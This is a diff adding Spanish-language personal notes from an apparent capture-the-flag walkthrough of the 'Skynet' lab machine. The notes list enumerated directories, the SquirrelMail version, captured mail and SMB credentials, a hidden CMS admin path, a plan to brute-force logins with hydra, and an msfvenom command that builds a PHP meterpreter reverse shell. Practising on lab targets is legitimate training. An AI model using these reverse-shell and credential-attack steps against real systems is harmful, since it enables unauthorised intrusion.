@@ -1,0 +1,57 @@
+
+1. Contraseñas que puedo probar on hydra en el ssh o la pagina /aquirrelmail 
+
+
+2. Dirs encontrados :
+
+==> DIRECTORY: http://10.10.158.204/admin/                                                 
+==> DIRECTORY: http://10.10.158.204/config/                              
+==> DIRECTORY: http://10.10.158.204/css/                                                                     
+==> DIRECTORY: http://10.10.158.204/js/                                                                      
+==> DIRECTORY: http://10.10.158.204/squirrelmail/
+
+
+3. SquirrelMail version 1.4.23
+
+
+
+---------------------------------------------------
+
+username : milesdyson
+
+password : cyborg007haloterminator
+
+
+-------------------------------------------
+Mensaje enviado por skynet :
+
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+
+
+-------------------------------------------
+
+SMB milesdyson :
+
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+--------------------------------------
+
+http://10.10.127.181/45kra24zxs28v3yd/administrator
+
+---------------------------------------
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+
+
+--------------------------------------
+
+Leer la prueba de concepto y explotar la maquina .
+
+
+*----------------------------------------------
+
+
+
